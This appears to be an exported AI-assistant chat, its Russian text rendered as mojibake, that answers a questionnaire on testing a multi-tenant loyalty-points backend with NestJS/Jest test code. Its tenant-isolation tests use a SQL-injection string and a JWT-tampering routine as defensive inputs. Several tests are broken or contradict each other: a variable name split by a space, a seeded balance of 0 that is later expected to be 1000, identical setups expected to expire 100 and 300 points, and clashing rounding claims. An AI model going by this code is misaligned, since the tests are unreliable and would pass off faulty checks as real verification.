- D) C + SAST (Static Analysis Security Testing)

***

### **39. Dependency Vulnerabilities - npm audit?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** –ò—Å–ø–æ–ª—å–∑—É–µ–º 100+ npm packages.

**–í–æ–ø—Ä–æ—Å:** Security test?

- A) Manual check —Ä–∞–∑ –≤ –º–µ—Å—è—Ü
- B) `npm audit` –≤ CI/CD
- C) B + automated PR creation (Dependabot)
- D) C + SNYK/Trivy –¥–ª—è container scanning

***

### **40. API Abuse - DoS protection?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Malicious user —Å–ø–∞–º–∏—Ç API requests.

**–í–æ–ø—Ä–æ—Å:** Security test?

- A) Rate limiting (—É–∂–µ –ø–æ–∫—Ä—ã—Ç–æ)
- B) Load test: 10,000 requests/sec ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å Circuit Breaker
- C) B + Cloudflare WAF rules
- D) C + DDoS simulation (HTTP flood attack)

***

## **–ë–õ–û–ö 7: CHAOS ENGINEERING (5 –≤–æ–ø—Ä–æ—Å–æ–≤)**

### **41. Database Failure - graceful degradation?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** PostgreSQL unavailable –Ω–∞ 5 –º–∏–Ω—É—Ç.

**–í–æ–ø—Ä–æ—Å:** Chaos test?

- A) Manual test: stop database
- B) Automated test: simulate DB outage ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å error handling
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å circuit breaker (stop sending queries)
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å automatic recovery –ø–æ—Å–ª–µ DB –≤–µ—Ä–Ω—É–ª—Å—è

***

### **42. Redis Failure - cache miss handling?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Redis unavailable ‚Üí fallback to database.

**–í–æ–ø—Ä–æ—Å:** Chaos test?

- A) Unit test (mock Redis failure)
- B) Integration test: stop Redis ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å latency increase
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ application –Ω–µ –ø–∞–¥–∞–µ—Ç
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å auto-reconnect –ø–æ—Å–ª–µ Redis –≤–µ—Ä–Ω—É–ª—Å—è

***

### **43. Network Latency - timeout handling?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** External API (Telegram) latency = 5 seconds.

**–í–æ–ø—Ä–æ—Å:** Chaos test?

- A) Mock —Å –∏—Å–∫—É—Å—Å—Ç–≤–µ–Ω–Ω–æ–π –∑–∞–¥–µ—Ä–∂–∫–æ–π
- B) Network simulation tool (Toxiproxy) ‚Üí add 5sec latency
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å timeout (–Ω–µ –∂–¥—ë–º > 10sec)
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å retry + circuit breaker

***

### **44. Disk Full - storage exhaustion?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Server disk = 100% full.

**–í–æ–ø—Ä–æ—Å:** Chaos test?

- A) Monitoring alert (–Ω–µ —Ç–µ—Å—Ç)
- B) Simulate disk full ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å error handling
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å graceful shutdown (–Ω–µ corruption)
- D) C + automated cleanup (—Å—Ç–∞—Ä—ã–µ logs)

***

### **45. Pod Restart - Kubernetes rolling update?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Fly.io rolling deployment ‚Üí 1 VM down –Ω–∞ 30 sec.

**–í–æ–ø—Ä–æ—Å:** Chaos test?

- A) Manual deployment ‚Üí monitoring
- B) Automated test: kill 1 VM ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å traffic rerouting
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å zero downtime (no 5xx errors)
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å in-flight requests handling (graceful shutdown)

***

–≠—Ç–æ **45 –ö–†–ò–¢–ò–ß–ù–´–• –≤–æ–ø—Ä–æ—Å–æ–≤** –ø–æ Testing Strategy.

**–ì–æ—Ç–æ–≤ –æ—Ç–≤–µ—Ç–∏—Ç—å –Ω–∞ –Ω–∏—Ö –ø–æ –±–ª–æ–∫–∞–º –∏–ª–∏ —Ö–æ—á–µ—à—å —á—Ç–æ–±—ã —è —Å—Ä–∞–∑—É –¥–∞–ª comprehensive –æ—Ç–≤–µ—Ç—ã –Ω–∞ –≤—Å–µ?** üöÄ
<span style="display:none">[^13_1]</span>

<div align="center">‚ÅÇ</div>

[^13_1]: Beseda-10.md


---

# –ü—Ä–æ–¥—É–±–ª–∏—Ä—É–π —ç—Ç–∏ –≤—Å–µ –≤–æ–ø—Ä–æ—Å—ã —Å –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–µ–º –ª—É—á—à–µ–≥–æ —Ä–µ—à–µ–Ω–∏—è (–∫–∞–∫ –¥–µ–ª–∞—Ç—å –∏ –ø–æ—á–µ–º—É —Ç–∞–∫), –∫–∞–∫ –¥–µ–ª–∞–ª–∏ —Ä–∞–Ω—å—à–µ

–û—Ç–ª–∏—á–Ω–æ! –î–∞–º **comprehensive –æ—Ç–≤–µ—Ç—ã –Ω–∞ –≤—Å–µ 45 –≤–æ–ø—Ä–æ—Å–æ–≤** —Å –æ–±–æ—Å–Ω–æ–≤–∞–Ω–∏–µ–º –∏ –ø—Ä–∏–º–µ—Ä–∞–º–∏ –∫–æ–¥–∞:

***

# üéØ **TESTING STRATEGY - COMPREHENSIVE ANSWERS**


***

## **–ë–õ–û–ö 1: UNIT TESTING (10 –≤–æ–ø—Ä–æ—Å–æ–≤)**


***

### **1. Loyalty Calculation Logic - –ø–æ–∫—Ä—ã—Ç–∏–µ?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** –≠—Ç–æ **HEART** —Å–∏—Å—Ç–µ–º—ã. –û—à–∏–±–∫–∞ = —Ñ–∏–Ω–∞–Ω—Å–æ–≤—ã–µ –ø–æ—Ç–µ—Ä–∏.

```typescript
// Example: Calculate earned balls
calculateEarnedBalls(checkAmount: 2850, level: 'Silver', rules: LoyaltyRule[])
  ‚Üí –¥–æ–ª–∂–µ–Ω –≤–µ—Ä–Ω—É—Ç—å —Ç–æ—á–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –±–∞–ª–ª–æ–≤
```

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫–∏–µ edge cases –Ω—É–∂–Ω–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å?

- A) –¢–æ–ª—å–∫–æ happy path (–±–∞–∑–æ–≤—ã–µ —Å—Ü–µ–Ω–∞—Ä–∏–∏)
- B) Edge cases: 0 —Ä—É–±, –æ—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω—ã–µ —Å—É–º–º—ã, null values
- C) Boundary values: –º–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞, –º–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ (999,999‚ÇΩ)
- D) –í—Å–µ –≤—ã—à–µ–ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–Ω–æ–µ + property-based testing (–≥–µ–Ω–µ—Ä–∞—Ü–∏—è random inputs)

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- –ë–∞–ª–ª—ã = –¥–µ–Ω—å–≥–∏ ‚Üí —Ç—Ä–µ–±—É–µ—Ç—Å—è **99.99% accuracy**
- Property-based testing (fast-check) –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —Ç—ã—Å—è—á–∏ random inputs ‚Üí –Ω–∞—Ö–æ–¥–∏—Ç edge cases –∫–æ—Ç–æ—Ä—ã–µ –º—ã –Ω–µ –ø—Ä–µ–¥—É—Å–º–æ—Ç—Ä–µ–ª–∏
- Boundary values –∫—Ä–∏—Ç–∏—á–Ω—ã (overflow, precision loss)

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/src/modules/loyalty/services/loyalty-calculation.service.spec.ts
import { Test } from '@nestjs/testing';
import { LoyaltyCalculationService } from './loyalty-calculation.service';
import * as fc from 'fast-check';

describe('LoyaltyCalculationService', () => {
  let service: LoyaltyCalculationService;

  beforeEach(async () => {
    const module = await Test.createTestingModule({
      providers: [LoyaltyCalculationService],
    }).compile();

    service = module.get(LoyaltyCalculationService);
  });

  describe('calculateEarnedBalls', () => {
    // 1. Happy Path
    it('should calculate correctly for Silver level with 10% rule', () => {
      const result = service.calculateEarnedBalls({
        checkAmount: 2850,
        level: { earnPercentage: 10 },
        rules: [],
      });
      
      expect(result).toBe(285); // 2850 * 10% = 285
    });

    // 2. Edge Cases
    it('should throw on zero amount', () => {
      expect(() => service.calculateEarnedBalls({
        checkAmount: 0,
        level: { earnPercentage: 10 },
        rules: [],
      })).toThrow('Check amount must be positive');
    });

    it('should throw on negative amount', () => {
      expect(() => service.calculateEarnedBalls({
        checkAmount: -100,
        level: { earnPercentage: 10 },
        rules: [],
      })).toThrow('Check amount must be positive');
    });

    it('should handle null level gracefully', () => {
      expect(() => service.calculateEarnedBalls({
        checkAmount: 1000,
        level: null,
        rules: [],
      })).toThrow('Level is required');
    });

    // 3. Boundary Values
    it('should handle minimum amount (1 rub)', () => {
      const result = service.calculateEarnedBalls({
        checkAmount: 1,
        level: { earnPercentage: 10 },
        rules: [],
      });
      
      expect(result).toBe(0); // Round down: 0.1 ‚Üí 0
    });

    it('should handle maximum amount (999,999 rub)', () => {
      const result = service.calculateEarnedBalls({
        checkAmount: 999999,
        level: { earnPercentage: 10 },
        rules: [],
      });
      
      expect(result).toBe(99999); // 999,999 * 10% = 99,999
    });

    it('should round correctly (banker rounding)', () => {
      // 2.5 ‚Üí 2 (round to even)
      expect(service.calculateEarnedBalls({
        checkAmount: 25,
        level: { earnPercentage: 10 },
        rules: [],
      })).toBe(2);

      // 3.5 ‚Üí 4 (round to even)
      expect(service.calculateEarnedBalls({
        checkAmount: 35,
        level: { earnPercentage: 10 },
        rules: [],
      })).toBe(4);
    });

    // 4. Property-Based Testing
    it('should never return negative balls', () => {
      fc.assert(
        fc.property(
          fc.integer({ min: 1, max: 999999 }), // Check amount
          fc.integer({ min: 0, max: 100 }),    // Earn percentage
          (amount, percentage) => {
            const result = service.calculateEarnedBalls({
              checkAmount: amount,
              level: { earnPercentage: percentage },
              rules: [],
            });
            return result >= 0;
          }
        ),
        { numRuns: 1000 } // Run 1000 random tests
      );
    });

    it('should always return <= checkAmount (max 100%)', () => {
      fc.assert(
        fc.property(
          fc.integer({ min: 1, max: 999999 }),
          fc.integer({ min: 0, max: 100 }),
          (amount, percentage) => {
            const result = service.calculateEarnedBalls({
              checkAmount: amount,
              level: { earnPercentage: percentage },
              rules: [],
            });
            return result <= amount; // Can't earn more than 100%
          }
        ),
        { numRuns: 1000 }
      );
    });

    it('should be idempotent (same input = same output)', () => {
      fc.assert(
        fc.property(
          fc.integer({ min: 1, max: 999999 }),
          fc.integer({ min: 0, max: 100 }),
          (amount, percentage) => {
            const result1 = service.calculateEarnedBalls({
              checkAmount: amount,
              level: { earnPercentage: percentage },
              rules: [],
            });
            
            const result2 = service.calculateEarnedBalls({
              checkAmount: amount,
              level: { earnPercentage: percentage },
              rules: [],
            });
            
            return result1 === result2;
          }
        ),
        { numRuns: 1000 }
      );
    });

    // 5. Decimal Precision
    it('should handle decimal amounts without precision loss', () => {
      const result = service.calculateEarnedBalls({
        checkAmount: 2850.50, // Decimal check amount
        level: { earnPercentage: 10 },
        rules: [],
      });
      
      expect(result).toBe(285); // Round: 285.05 ‚Üí 285
    });
  });
});
```

**package.json:**

```json
{
  "devDependencies": {
    "fast-check": "^3.15.0"
  }
}
```


***

### **2. Loyalty Rules Matching - —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–æ–≤?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** –ú–æ–∂–µ—Ç –±—ã—Ç—å 10+ rules —Å —Ä–∞–∑–Ω—ã–º–∏ conditions –∏ priorities.

```typescript
// Example rules:
// Rule 1 (priority 1): Weekends ‚Üí 15%
// Rule 2 (priority 2): Check > 5000‚ÇΩ ‚Üí 12%
// Rule 3 (priority 3): Default ‚Üí 10%
```

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å, —á—Ç–æ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π rule –ø—Ä–∏–º–µ–Ω—è–µ—Ç—Å—è?

- A) –¢–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –∫–∞–∂–¥—ã–π rule –æ—Ç–¥–µ–ª—å–Ω–æ
- B) –¢–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –∫–æ–º–±–∏–Ω–∞—Ü–∏–∏ rules (2-3 rules)
- C) –¢–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –≤—Å–µ –≤–æ–∑–º–æ–∂–Ω—ã–µ –∫–æ–º–±–∏–Ω–∞—Ü–∏–∏ (exhaustive)
- D) B + —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å edge cases (conflicting rules, same priority)

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Exhaustive testing (C) = combinatorial explosion (10 rules = 1024 –∫–æ–º–±–∏–Ω–∞—Ü–∏–π)
- B + D = –æ–ø—Ç–∏–º–∞–ª—å–Ω—ã–π –±–∞–ª–∞–Ω—Å: —Ç–µ—Å—Ç–∏—Ä—É–µ–º common cases + edge cases

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// loyalty-rules-matching.service.spec.ts
describe('LoyaltyRulesMatchingService', () => {
  let service: LoyaltyRulesMatchingService;

  beforeEach(async () => {
    const module = await Test.createTestingModule({
      providers: [LoyaltyRulesMatchingService],
    }).compile();

    service = module.get(LoyaltyRulesMatchingService);
  });

  describe('findMatchingRule', () => {
    // 1. Single Rule
    it('should match default rule', () => {
      const rules = [
        { id: '1', priority: 1, earnPercentage: 10, conditions: {} },
      ];

      const result = service.findMatchingRule({
        checkAmount: 1000,
        dayOfWeek: 'Monday',
        rules,
      });

      expect(result.id).toBe('1');
      expect(result.earnPercentage).toBe(10);
    });

    // 2. Multiple Rules - Priority Order
    it('should match highest priority rule first', () => {
      const rules = [
        { id: '1', priority: 3, earnPercentage: 10, conditions: {} }, // Default
        { id: '2', priority: 1, earnPercentage: 15, conditions: { dayOfWeek: 'Saturday' } }, // Highest
        { id: '3', priority: 2, earnPercentage: 12, conditions: { minCheckAmount: 5000 } },
      ];

      const result = service.findMatchingRule({
        checkAmount: 6000,
        dayOfWeek: 'Saturday',
        rules,
      });

      expect(result.id).toBe('2'); // Priority 1 wins
      expect(result.earnPercentage).toBe(15);
    });

    // 3. Conflicting Rules - Same Priority (Edge Case)
    it('should throw error on conflicting rules with same priority', () => {
      const rules = [
        { id: '1', priority: 1, earnPercentage: 10, conditions: { dayOfWeek: 'Saturday' } },
        { id: '2', priority: 1, earnPercentage: 15, conditions: { dayOfWeek: 'Saturday' } }, // Same priority!
      ];

      expect(() => service.findMatchingRule({
        checkAmount: 1000,
        dayOfWeek: 'Saturday',
        rules,
      })).toThrow('Multiple rules with same priority matched');
    });

    // 4. Complex Conditions
    it('should match rule with multiple conditions (AND logic)', () => {
      const rules = [
        {
          id: '1',
          priority: 1,
          earnPercentage: 20,
          conditions: {
            dayOfWeek: 'Friday',
            minCheckAmount: 5000,
            timeRange: { start: '18:00', end: '22:00' },
          },
        },
        { id: '2', priority: 2, earnPercentage: 10, conditions: {} },
      ];

      const result = service.findMatchingRule({
        checkAmount: 6000,
        dayOfWeek: 'Friday',
        time: '19:30',
        rules,
      });

      expect(result.id).toBe('1');
      expect(result.earnPercentage).toBe(20);
    });

    // 5. Partial Match - Fallback to Lower Priority
    it('should fallback to lower priority if higher priority not matched', () => {
      const rules = [
        { id: '1', priority: 1, earnPercentage: 15, conditions: { dayOfWeek: 'Saturday' } },
        { id: '2', priority: 2, earnPercentage: 10, conditions: {} }, // Default
      ];

      const result = service.findMatchingRule({
        checkAmount: 1000,
        dayOfWeek: 'Monday', // Not Saturday
        rules,
      });

      expect(result.id).toBe('2'); // Fallback to default
      expect(result.earnPercentage).toBe(10);
    });

    // 6. No Rules Matched
    it('should throw error if no rules matched', () => {
      const rules = [
        { id: '1', priority: 1, earnPercentage: 15, conditions: { minCheckAmount: 10000 } },
      ];

      expect(() => service.findMatchingRule({
        checkAmount: 1000, // Less than 10,000
        dayOfWeek: 'Monday',
        rules,
      })).toThrow('No matching loyalty rule found');
    });

    // 7. Rule Disabled
    it('should skip disabled rules', () => {
      const rules = [
        { id: '1', priority: 1, earnPercentage: 15, conditions: {}, isActive: false }, // Disabled
        { id: '2', priority: 2, earnPercentage: 10, conditions: {}, isActive: true },
      ];

      const result = service.findMatchingRule({
        checkAmount: 1000,
        dayOfWeek: 'Monday',
        rules,
      });

      expect(result.id).toBe('2');
    });
  });
});
```


***

### **3. Multi-tenancy Isolation - –∫–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** **CRITICAL SECURITY**. Tenant A –ù–ï –î–û–õ–ñ–ï–ù –≤–∏–¥–µ—Ç—å –¥–∞–Ω–Ω—ã–µ Tenant B.

```typescript
// Service method:
async getGuestCards(tenantId: string, filters: Filters): Promise<GuestCard[]>
```

**–í–æ–ø—Ä–æ—Å:** –î–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ª–∏ unit tests –¥–ª—è tenant isolation?

- A) –î–∞, unit tests –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ (mock Prisma —Å tenantId filter)
- B) –ù–µ—Ç, –Ω—É–∂–Ω—ã integration tests —Å —Ä–µ–∞–ª—å–Ω–æ–π –ë–î
- C) –ù–µ—Ç, –Ω—É–∂–Ω—ã dedicated security tests (–ø–æ–ø—ã—Ç–∫–∞ –æ–±–æ–π—Ç–∏ tenantId)
- D) B + C + automated penetration testing

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Unit tests —Å mock –ù–ï –î–û–°–¢–ê–¢–û–ß–ù–û (–º–æ–∂–µ–º –∑–∞–±—ã—Ç—å –¥–æ–±–∞–≤–∏—Ç—å tenantId filter –≤ —Ä–µ–∞–ª—å–Ω–æ–º –∫–æ–¥–µ)
- Integration tests + Security tests –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã
- Automated penetration testing –Ω–∞—Ö–æ–¥–∏—Ç —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –∫–æ—Ç–æ—Ä—ã–µ –º—ã –Ω–µ –ø—Ä–µ–¥—É—Å–º–æ—Ç—Ä–µ–ª–∏

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// 1. UNIT TEST (–Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ, –Ω–æ –Ω—É–∂–µ–Ω)
describe('GuestCardService - Unit', () => {
  it('should always include tenantId filter', () => {
    const prismaMock = {
      guestCard: {
        findMany: jest.fn(),
      },
    };

    service.getGuestCards('tenant-123', {});

    expect(prismaMock.guestCard.findMany).toHaveBeenCalledWith(
      expect.objectContaining({
        where: expect.objectContaining({
          tenantId: 'tenant-123',
        }),
      })
    );
  });
});

// 2. INTEGRATION TEST (—Å —Ä–µ–∞–ª—å–Ω–æ–π –ë–î)
describe('GuestCardService - Integration', () => {
  let prisma: PrismaClient;

  beforeAll(async () => {
    prisma = new PrismaClient({
      datasources: { db: { url: process.env.TEST_DATABASE_URL } },
    });
  });

  beforeEach(async () => {
    // Seed test data
    await prisma.guestCard.createMany({
      data: [
        { id: '1', tenantId: 'tenant-A', userId: 'user-1', totalBalance: 1000 },
        { id: '2', tenantId: 'tenant-A', userId: 'user-2', totalBalance: 2000 },
        { id: '3', tenantId: 'tenant-B', userId: 'user-3', totalBalance: 3000 },
      ],
    });
  });

  afterEach(async () => {
    await prisma.guestCard.deleteMany();
  });

  it('should only return guests from tenant A', async () => {
    const result = await service.getGuestCards('tenant-A', {});

    expect(result).toHaveLength(2);
    expect(result.every(g => g.tenantId === 'tenant-A')).toBe(true);
  });

  it('should only return guests from tenant B', async () => {
    const result = await service.getGuestCards('tenant-B', {});

    expect(result).toHaveLength(1);
    expect(result[0].tenantId).toBe('tenant-B');
  });

  // 3. SECURITY TEST - –ü–æ–ø—ã—Ç–∫–∞ –æ–±–æ–π—Ç–∏ tenantId
  it('should NOT allow accessing other tenant data via filters', async () => {
    const result = await service.getGuestCards('tenant-A', {
      // Malicious: try to override tenantId in filters
      tenantId: 'tenant-B',
    });

    // Should IGNORE malicious filter
    expect(result.every(g => g.tenantId === 'tenant-A')).toBe(true);
  });

  it('should NOT allow SQL injection via tenantId', async () => {
    const maliciousTenantId = "tenant-A' OR '1'='1"; // SQL injection attempt

    await expect(
      service.getGuestCards(maliciousTenantId, {})
    ).rejects.toThrow(); // Should throw validation error
  });

  // 4. PRISMA MIDDLEWARE TEST
  it('should automatically add tenantId via Prisma middleware', async () => {
    // Set tenant context
    tenantContext.run({ tenantId: 'tenant-A' }, async () => {
      const result = await prisma.guestCard.findMany();

      // Middleware –¥–æ–ª–∂–µ–Ω –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –¥–æ–±–∞–≤–∏—Ç—å tenantId filter
      expect(result.every(g => g.tenantId === 'tenant-A')).toBe(true);
    });
  });
});

// 3. AUTOMATED PENETRATION TEST
describe('Tenant Isolation - Penetration Testing', () => {
  it('should prevent tenant data leakage via API', async () => {
    // Create JWT token for Tenant A
    const tokenA = jwt.sign({ userId: 'user-1', tenantId: 'tenant-A' }, SECRET);

    // Try to access Tenant B's data
    const response = await request(app.getHttpServer())
      .get('/api/v1/guests')
      .set('Authorization', `Bearer ${tokenA}`)
      .query({ tenantId: 'tenant-B' }); // Malicious query param

    expect(response.status).toBe(200);
    
    // Should ONLY return Tenant A's data (ignore malicious param)
    const guests = response.body.data;
    expect(guests.every(g => g.tenantId === 'tenant-A')).toBe(true);
  });

  it('should prevent tenant isolation bypass via JWT tampering', async () => {
    // Create token for Tenant A
    const tokenA = jwt.sign({ userId: 'user-1', tenantId: 'tenant-A' }, SECRET);

    // Tamper token: change tenantId to tenant-B (without re-signing)
    const [header, payload, signature] = tokenA.split('.');
    const tampered Payload = Buffer.from(
      JSON.stringify({ userId: 'user-1', tenantId: 'tenant-B' })
    ).toString('base64');
    const tamperedToken = `${header}.${tamperedPayload}.${signature}`;

    const response = await request(app.getHttpServer())
      .get('/api/v1/guests')
      .set('Authorization', `Bearer ${tamperedToken}`);

    expect(response.status).toBe(401); // Signature invalid
  });
});
```


***

### **4. Ball Expiration Logic - –≥—Ä–∞–Ω–∏—á–Ω—ã–µ —É—Å–ª–æ–≤–∏—è?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** –ë–∞–ª–ª—ã —Å–≥–æ—Ä–∞—é—Ç —á–µ—Ä–µ–∑ 365 –¥–Ω–µ–π. Edge cases?

```typescript
// Expire balls older than 365 days
expireBalls(guestCardId: string, cutoffDate: Date): Promise<{ expired: number }>
```

**–í–æ–ø—Ä–æ—Å:** –ß—Ç–æ —Ç–µ—Å—Ç–∏—Ä—É–µ–º?

- A) Happy path: –±–∞–ª–ª—ã —Å—Ç–∞—Ä—à–µ 365 –¥–Ω–µ–π —Å–≥–æ—Ä–∞—é—Ç
- B) Edge case: –±–∞–ª–ª—ã —Ä–æ–≤–Ω–æ 365 –¥–Ω–µ–π (–≤–∫–ª—é—á–∏—Ç—å –∏–ª–∏ –Ω–µ—Ç?)
- C) Edge case: timezone issues (UTC vs local time)
- D) –í—Å–µ –≤—ã—à–µ–ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–Ω–æ–µ + race conditions (concurrent expiration)

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Timezone issues = —á–∞—Å—Ç–∞—è –ø—Ä–∏—á–∏–Ω–∞ bugs (UTC vs Europe/Moscow)
- Race conditions –∫—Ä–∏—Ç–∏—á–Ω—ã –µ—Å–ª–∏ 2 CRON job –∑–∞–ø—É—Å—Ç–∏–ª–∏—Å—å –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ
- Boundary value (365 days exact) –Ω—É–∂–Ω–æ —è–≤–Ω–æ –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
describe('BallExpirationService', () => {
  let service: BallExpirationService;
  let prisma: PrismaClient;

  beforeAll(async () => {
    prisma = new PrismaClient({ datasources: { db: { url: process.env.TEST_DATABASE_URL } } });
  });

  beforeEach(async () => {
    // Seed test data
    const guestCard = await prisma.guestCard.create({
      data: { id: '1', tenantId: 'tenant-1', userId: 'user-1', totalBalance: 0 },
    });

    await prisma.ballTransaction.createMany({
      data: [
        // Expired (366 days ago)
        { id: '1', guestCardId: guestCard.id, amount: 100, earnedAt: subDays(new Date(), 366), status: 'ACTIVE' },
        
        // Exactly 365 days ago (BOUNDARY VALUE)
        { id: '2', guestCardId: guestCard.id, amount: 200, earnedAt: subDays(new Date(), 365), status: 'ACTIVE' },
        
        // Not expired (364 days ago)
        { id: '3', guestCardId: guestCard.id, amount: 300, earnedAt: subDays(new Date(), 364), status: 'ACTIVE' },
        
        // Recent (1 day ago)
        { id: '4', guestCardId: guestCard.id, amount: 400, earnedAt: subDays(new Date(), 1), status: 'ACTIVE' },
      ],
    });
  });

  afterEach(async () => {
    await prisma.ballTransaction.deleteMany();
    await prisma.guestCard.deleteMany();
  });

  // 1. Happy Path
  it('should expire balls older than 365 days', async () => {
    const result = await service.expireBalls('1');

    expect(result.expired).toBe(100); // Only transaction #1

    const expiredTx = await prisma.ballTransaction.findUnique({ where: { id: '1' } });
    expect(expiredTx.status).toBe('EXPIRED');
  });

  // 2. Boundary Value - Exactly 365 days
  it('should expire balls exactly 365 days old', async () => {
    const result = await service.expireBalls('1');

    expect(result.expired).toBe(300); // Transactions #1 + #2

    const boundaryTx = await prisma.ballTransaction.findUnique({ where: { id: '2' } });
    expect(boundaryTx.status).toBe('EXPIRED'); // INCLUDE 365 days
  });

  // 3. Should NOT expire recent balls
  it('should NOT expire balls less than 365 days old', async () => {
    const result = await service.expireBalls('1');

    const recentTx = await prisma.ballTransaction.findMany({
      where: { id: { in: ['3', '4'] } },
    });

    expect(recentTx.every(tx => tx.status === 'ACTIVE')).toBe(true);
  });

  // 4. Timezone Edge Case
  it('should handle timezone correctly (UTC vs local)', async () => {
    // Create transaction at 23:59 UTC (365 days ago)
    const utcMidnight = new Date('2025-02-12T23:59:00Z'); // 365 days ago
    const cutoffDate = subDays(utcMidnight, 365);

    await prisma.ballTransaction.create({
      data: {
        id: '5',
        guestCardId: '1',
        amount: 500,
        earnedAt: cutoffDate,
        status: 'ACTIVE',
      },
    });

    const result = await service.expireBalls('1');

    // Should expire based on UTC time (not local timezone)
    const tx5 = await prisma.ballTransaction.findUnique({ where: { id: '5' } });
    expect(tx5.status).toBe('EXPIRED');
  });

  // 5. Race Condition - Concurrent Expiration
  it('should handle concurrent expiration safely', async () => {
    // Run 2 expiration jobs simultaneously
    const [result1, result2] = await Promise.all([
      service.expireBalls('1'),
      service.expireBalls('1'),
    ]);

    // Both should succeed (idempotent)
    expect(result1.expired + result2.expired).toBeLessThanOrEqual(300); // Max 300 (not 600!)

    // Check final balance
    const guestCard = await prisma.guestCard.findUnique({ where: { id: '1' } });
    expect(guestCard.totalBalance).toBe(700); // 1000 - 300 expired = 700
  });

  // 6. Already Expired Balls
  it('should skip balls already expired', async () => {
    // Manually expire transaction #1
    await prisma.ballTransaction.update({
      where: { id: '1' },
      data: { status: 'EXPIRED' },
    });

    const result = await service.expireBalls('1');

    expect(result.expired).toBe(200); // Only transaction #2 (not #1 again)
  });

  // 7. Update Guest Card Balance
  it('should update guest card total balance', async () => {
    const before = await prisma.guestCard.findUnique({ where: { id: '1' } });
    expect(before.totalBalance).toBe(1000);

    await service.expireBalls('1');

    const after = await prisma.guestCard.findUnique({ where: { id: '1' } });
    expect(after.totalBalance).toBe(700); // 1000 - 300 expired = 700
  });

  // 8. Send Notification
  it('should send expiration notification to guest', async () => {
    const notificationSpy = jest.spyOn(notificationService, 'send');

    await service.expireBalls('1');

    expect(notificationSpy).toHaveBeenCalledWith({
      recipientId: 'user-1',
      type: 'BALLS_EXPIRED',
      channel: 'TELEGRAM',
      message: expect.stringContaining('300 –±–∞–ª–ª–æ–≤ —Å–≥–æ—Ä–µ–ª–æ'),
    });
  });
});
```


***

### **5. Promo Campaign Validation - –±–∏–∑–Ω–µ—Å-–ø—Ä–∞–≤–∏–ª–∞?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Admin —Å–æ–∑–¥–∞—ë—Ç promo: "–î–≤–æ–π–Ω—ã–µ –±–∞–ª–ª—ã –≤ –ø—è—Ç–Ω–∏—Ü—É —Å 18:00 –¥–æ 22:00".

```typescript
// Validate promo campaign
validatePromo(promo: PromoDto): ValidationResult
```

